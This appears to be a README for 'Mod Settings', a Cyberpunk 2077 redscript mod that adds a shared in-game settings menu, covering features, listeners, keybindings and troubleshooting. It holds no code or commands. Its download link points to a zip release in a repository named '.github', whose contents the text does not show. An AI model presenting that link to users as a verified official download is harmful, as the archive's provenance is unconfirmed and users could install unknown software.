
<h1 align="center">Mod Settings</h1>

<p align="center">
  <img src="https://staticdelivery.nexusmods.com/mods/3333/images/4885/4885-1658548659-1491857712.jpeg" alt="Mod Settings Preview">
</p>

**Mod Settings** is a shared configuration framework for Cyberpunk 2077 that adds a dedicated settings page to the game's main menu. It allows compatible redscript mods to register their own configuration options and provide a centralized in-game interface for managing them.

**Download:** [Mod Settings](https://github.com/Mod-Settings/.github/releases/download/1/Mod.Settings.Cyberpunk.2077.zip)

## Overview

Mod Settings provides a unified configuration interface for redscript-based mods. Instead of requiring separate configuration files or external tools, compatible mods can expose their settings directly through the game's menu.

The framework handles setting registration, value management, change notifications, and persistent configuration, giving mod developers a common foundation for integrating customizable options.

## Features

- **Centralized Configuration** — Access settings from compatible mods through a dedicated in-game menu.
- **Redscript Integration** — Register configuration variables directly through redscript classes and runtime properties.
- **Live Change Notifications** — Register class-level or global listeners to respond when settings are requested, accepted, or updated.
- **Persistent Settings** — Retain saved configuration values across game sessions.
- **Advanced Value Support** — Configure enum display names, custom option labels, and localized text.
- **Keybinding Overrides** — Support configurable input bindings through compatible Input Loader XML definitions.
- **Shared Mod Interface** — Allow multiple compatible mods to contribute their own settings pages to the same menu.

## In-Game Settings Interface

The framework adds a dedicated **Mod Settings** entry to the Cyberpunk 2077 menu.

<p align="center">
  <img src="https://staticdelivery.nexusmods.com/mods/3333/images/4885/4885-1678206706-2025007978.jpeg" alt="Mod Settings shared configuration interface">
</p>

Each compatible mod can register its own settings, allowing players to manage multiple configurations from one place. The options shown in the screenshot are provided by the integrating mods, not built-in gameplay features of Mod Settings.

## Modding Integration

Mod Settings is designed as a shared framework for developers working with redscript.

Configuration variables can be exposed through runtime properties, while listener registration allows mods to react to changes without implementing their own settings interface.

Developers can also use global modification listeners to handle requested and accepted changes, as well as overall settings updates.

For keybinding configuration, the framework supports Input Loader-compatible XML definitions using the `overridableUI` attribute.


## Compatibility Notes

- Mod Settings is designed for redscript-based integrations.
- It is separate from Native Settings UI, which is intended for Cyber Engine Tweaks (CET) mods.
- Compatible mods must explicitly integrate with Mod Settings to expose their configuration options.
- If the Mod Settings menu entry is missing, check `r6/logs/redscript_rCURRENT.log` for script compilation errors.
- Verify that your mod manager has deployed the `red4ext/plugins/mod_settings/` directory correctly.
